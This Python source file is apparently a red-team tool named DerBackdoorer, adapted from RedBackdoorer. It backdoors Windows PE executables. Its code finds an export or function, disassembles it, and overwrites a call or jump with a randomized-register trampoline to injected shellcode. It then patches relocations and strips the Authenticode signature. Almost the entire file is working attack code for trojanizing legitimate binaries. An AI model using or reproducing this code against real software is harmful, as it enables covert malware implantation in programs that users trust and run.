#!/usr/bin/python3
#
# Based on the original RedBackdoorer by Mariusz Banach
#

import random
import textwrap
import pefile
import capstone
import keystone
from enum import IntEnum
import logging

from utils import hexdump
from pe.superpe import SuperPe
from model.defs import *

logger = logging.getLogger("DerBackdoorer")


class PeBackdoor:
    def __init__(self, superpe: SuperPe, main_shc: bytes, carrier_invoke_style: CarrierInvokeStyle):
        self.superpe: SuperPe = superpe
        self.carrier_invoke_style: CarrierInvokeStyle = carrier_invoke_style
        self.shellcodeData: bytes = main_shc

        # Working
        self.shellcodeOffset: int  = 0    # from start of the file
        self.shellcodeOffsetRel: int = 0  # from start of the code section
        self.shellcodeAddr: int = 0       
        self.backdoorOffsetRel: int = 0   # from start of the code section


    def getExportEntryPoint(self, exportName: str):
        dec = lambda x: '???' if x is None else x.decode() 
        d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
        self.superpe.pe.parse_data_directories(directories=d)

        if self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
            raise Exception('No DLL exports found!')
        
        exports = [(e.ordinal, dec(e.name)) for e in self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols]
        chosen_export = None
        for export in exports:
            #logger.debug(f'DLL Export: {export[0]} {export[1]}')
            if export[1].lower() == exportName.lower():
                chosen_export = export
                break
        #export = exports[0]
        #if choose_random:
        #    export = exports[0]
        logger.info("Export: {} {}".format(chosen_export[0], chosen_export[1]))
        name = chosen_export[1]
        #addr = self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]].address
        for exp in self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols:
            #logger.info("-- {} {}".format(hex(exp.address), exp.name.decode()))
            if exp.name.decode() == name:
                #print(hex(exp.address), exp.name.decode())
                addr = exp.address
        return addr
    

    def backdoor_function(self, function_addr, shellcode_addr):
        #imageBase = self.superpe.pe.OPTIONAL_HEADER.ImageBase
        #self.shellcodeAddr = self.superpe.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase

        cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64 + capstone.CS_MODE_LITTLE_ENDIAN)
        ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64 + keystone.KS_MODE_LITTLE_ENDIAN)
        cs.detail = True

        #if addr == -1:
        #    ep = self.superpe.get_entrypoint()
        #    logger.info("--[ BackdoorEntryPoint(): Use Entry Point 0x{:X}".format(ep))
        #else:
        #    ep = addr
        #    logger.info("--[ BackdoorEntryPoint(): Use Addr 0x{:X}".format(ep))

        #ep_ava = ep + self.superpe.pe.OPTIONAL_HEADER.ImageBase
        #data = self.superpe.pe.get_memory_mapped_image()[ep:ep+128]
        #offset = 0
        #logger.debug('Entry Point disasm:')

        disasmData = self.superpe.pe.get_memory_mapped_image()
        output = self.superpe.disasmBytes(cs, ks, disasmData, function_addr, 128, self.backdoorInstruction)

        # store offset... by calculating it first FUCK
        section = self.superpe.get_code_section()
        self.backdoorOffsetRel = output - section.VirtualAddress

        if False:
            if output != 0:
                logger.debug('Now disasm looks like follows: ')

                disasmData = self.superpe.pe.get_memory_mapped_image()
                self.superpe.disasmBytes(cs, ks, disasmData, output - 32, 32, None, maxDepth = 3)

                logger.debug('\n[>] Inserted backdoor code: ')
                for instr in cs.disasm(bytes(self.compiledTrampoline), output):
                    self.superpe.printInstr(instr, 1)

                logger.debug('')
                self.superpe.disasmBytes(cs, ks, disasmData, output + len(self.compiledTrampoline), 32, None, maxDepth = 3)

            else:
                logger.error('Did not find suitable candidate for Entry Point branch hijack!')

        return output
    

    def getBackdoorTrampoline(self, cs, ks, instr):
        trampoline = ''
        addrOffset = -1

        if self.superpe.is_64():
            registers = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi']
        else:
            # Not really used
            registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi'] 

        reg = random.choice(registers).upper()
        reg2 = random.choice(registers).upper()

        while reg2 == reg:
            reg2 = random.choice(registers).upper()

        enc, count = ks.asm(f'MOV {reg}, 0x{self.shellcodeAddr:X}')
        for instr2 in cs.disasm(bytes(enc), 0):
            addrOffset = len(instr2.bytes) - instr2.addr_size
            break

        found = instr.mnemonic.lower() in ['jmp', 'je', 'jz', 'jne', 'jnz', 'ja', 'jb', 'jae', 'jbe', 'jg', 'jl', 'jge', 'jle']
        found |= instr.mnemonic.lower() == 'call'

        if found:
            logger.info(f'---[ Backdooring entry point {instr.mnemonic.upper()} instruction at RVA 0x{instr.address:X} into:')

            jump = random.choice([
                f'CALL {reg}',

                #
                # During my tests I found that CALL reg works stabily all the time, whereas below two gadgets
                # are known to crash on seldom occassions.
                #

                #f'JMP {reg}',
                #f'PUSH {reg} ; RET',
            ])

            trampoline = f'MOV {reg}, 0x{self.shellcodeAddr:X} ; {jump}'

        for ins in trampoline.split(';'):
            logger.info(f'\t{ins.strip()}')

        return (trampoline, addrOffset)
    

    def backdoorInstruction(self, cs, ks, disasmData, startOffset, instr, operand, depth):
        encoding = b''
        count = 0

        if depth < 2: 
            return 0

        (trampoline, addrOffset) = self.getBackdoorTrampoline(cs, ks, instr)

        if len(trampoline) > 0:
            encoding, count = ks.asm(trampoline)
            self.superpe.pe.set_bytes_at_rva(instr.address, bytes(encoding))

            relocs = (
                instr.address + addrOffset,
            )

            pageRva = 4096 * int((instr.address + addrOffset) / 4096)
            self.superpe.addImageBaseRelocations(pageRva, relocs)

            self.trampoline = trampoline
            self.compiledTrampoline = encoding
            self.compiledTrampolineCount = count

            logger.debug('Successfully backdoored entry point with jump/call to shellcode')
            return instr.address

        return 0


    def removeSignature(self):
        addr = self.superpe.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress
        size = self.superpe.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size

        self.superpe.pe.set_bytes_at_rva(addr, b'\x00' * size)

        self.superpe.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0
        self.superpe.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0

        logger.info('PE executable Authenticode signature removed.')
        return True